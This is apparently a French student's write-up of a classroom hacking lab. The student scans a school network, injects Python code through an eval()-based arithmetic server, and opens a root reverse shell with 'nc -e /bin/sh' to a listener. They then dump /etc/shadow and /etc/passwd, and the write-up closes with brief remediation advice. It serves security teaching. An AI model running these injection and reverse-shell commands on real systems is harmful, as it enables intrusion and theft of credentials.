# TP5 : Exploit, pwn, fix

Encore un TP de dév, mais où vous ne développez pas ! Pas mal nan ?

Le but : **exploiter un code vulnérable et proposer des remédiations** pour qu'il ne le soit plus.

La mise en situation est assez proche d'un cas réel, en restant dans des conditions de TP.

> **Pour maximiser le fun, ne discutez de rien de tout ça ni avec les dévs, ni avec les infras**, restez dans votre secte de sécu :D Si tu joues le jeu c'est un exercice cool, moins tu le jeu, plus il est nul !

![Gunna be hax](./img/gunna_be_hacker.png)

## Sommaire

- [TP5 : Exploit, pwn, fix](#tp5--exploit-pwn-fix)
  - [Sommaire](#sommaire)
  - [0. Setup](#0-setup)
  - [1. Reconnaissance](#1-reconnaissance)
  - [2. Exploit](#2-exploit)
  - [3. Reverse shell](#3-reverse-shell)
  - [4. Bonus : DOS](#4-bonus--dos)
  - [II. Remédiation](#ii-remédiation)

## 0. Setup

➜ **Je vous filerai un lien en cours pour télécharger le client d'une application**

- pas possible de commencer le TP tant que j'ai rien donné donc, attendez le feu vert !

➜ Votre but : 🏴‍☠️ **prendre le contrôle du serveur** 🏴‍☠️

## 1. Reconnaissance

> ***Cette section est en grande partie uniquement réalisable en cours. Perdez pas de temps.***

➜ On a de la chance dis donc ! Du Python pas compilé !

- prenez le temps de lire le code
- essayez de le lancer et de capter à quoi il sert

🌞 **Déterminer**

IP : 10.1.2.12
PORT :13337


```
PS C:\Users\guill\TP-Reseau-B2> & C:/Users/guill/AppData/Local/Microsoft/WindowsApps/python3.12.exe c:/Users/guill/TP-Reseau-B2/5/client.py
ERROR 2023-11-30 15:20:35,861 Impossible de se connecter au serveur 10.1.2.12 sur le port 13337
```

➜ **On me dit à l'oreillette que cette app est actuellement hébergée au sein de l'école.**

🌞 **Scanner le réseau**

```
PS C:\Users\guill> nmap -T2 -Pn -sT -p13337 10.33.64.1/20
```

[Resultat](./result.txt)

🦈 **tp5_nmap.pcapng**

![Capture](./result.pcapng)

🌞 **Connectez-vous au serveur**

```python
IP = 10.33.67.166
PORT = 13337
```

```
PS C:\Users\guill\TP-Reseau-B2> & C:/Users/guill/AppData/Local/Microsoft/WindowsApps/python3.12.exe c:/Users/guill/TP-Reseau-B2/5/client.py
Veuillez saisir une opération arithmétique : 9*9
```

## 2. Exploit

➜ **On est face à une application qui, d'une façon ou d'une autre, prend ce que le user saisit, et l'évalue.**

Ca doit lever un giga red flag dans votre esprit de hacker ça. Tu saisis ce que tu veux, et le serveur le lit et l'interprète.

🌞 **Injecter du code serveur**

```
PS C:\Users\guill\TP-Reseau-B2> & C:/Users/guill/AppData/Local/Microsoft/WindowsApps/python3.12.exe c:/Users/guill/TP-Reseau-B2/5/client.py
Veuillez saisir une opération arithmétique : __import__('subprocess').getoutput('echo coucou')
```

Log

```log
2023-11-30 16:35:59 INFO Connexion r�ussie � 10.33.67.166:13337
2023-11-30 16:36:09 INFO Message envoy� au serveur 10.33.67.166 : __import__('subprocess').getoutput('echo Bonjour Lorens comment �a va ?')
```

## 3. Reverse shell

🌞 **Obtenez un reverse shell sur le serveur**

- **en premier**
  ```
  PS C:\Users\guill> ncat -l -vv -p 9999     
  ```
- **en deuxième**
  ```log
  INFO Connexion reussie : 10.33.70.40:50002
  INFO Message envoye au serveur 10.33.70.40 : __import__('subprocess').getoutput('yum install nc -y')
  INFO Reponse recue du serveur 10.33.70.40 : b'Last metadata expiration check: 0:22:28 ago on Fri 01 Dec 2023 02:22:47 PM CET.\nPackage nmap-ncat-3:7.92-1.el9.x86_64 is already installed.\nDependencies resolved.\nNothing to do.\nComplete!'
  INFO Connexion reussie : 10.33.70.40:50002
  INFO Message envoye au serveur 10.33.70.40 : __import__('subprocess').getoutput('nc -e /bin/sh 10.33.76.184 9999')
  ```
- **enfin**
  ```
  Ncat: Connection from 10.33.70.40:41324.
  echo toto
  toto
  whoami
  root
  ```

🌞 **Pwn**

- voler les fichiers `/etc/shadow` et `/etc/passwd`
[Shadow](./shadow.txt)
[Passwd](./passwd.txt)
- voler le code serveur de l'application
[Code](./server.py)
- déterminer si d'autres services sont disponibles sur la machine
[Services](./service.txt)

## 4. Bonus : DOS

Le DOS dans l'esprit, souvent c'est :

- d'abord t'es un moldu et tu trouves ça incroyable
- tu deviens un tech, tu te rends compte que c'est pas forcément si compliqué, ptet tu essaies
- tu deviens meilleur et tu te dis que c'est super lame, c'est nul techniquement, ça mène à rien, exploit c'est mieux
- tu deviens conscient, et ptet que parfois, des situations t'amèneront à trouver finalement le principe pas si inutile (politique ? militantisme ?)

⭐ **BONUS : DOS l'application**

- faut que le service soit indispo, d'une façon ou d'une autre
- fais le crash, fais le sleep, fais le s'arrêter, peu importe

## II. Remédiation

🌞 **Proposer une remédiation dév**

Code clienet.py :
Supprimer la condition qui vérifie si l'imput est un nombre ou pas
[CodeClient](./client.py)

Code server.py :
Rajoute la condition initialement présent dans client.py pour vérifier si l'imput est un nombre ou pas
Attention à l'utilisation de eval() qui est dangereux
[CodeServer](./server.py)

🌞 **Proposer une remédiation système**

Créer un nouveau user avec des droits limités et lancer le service avec ce user pour que le service ne puisse pas accéder à des fichiers sensibles

On ne doit pas pouvoir ouvrir le firewall avec le user sauf le port du service


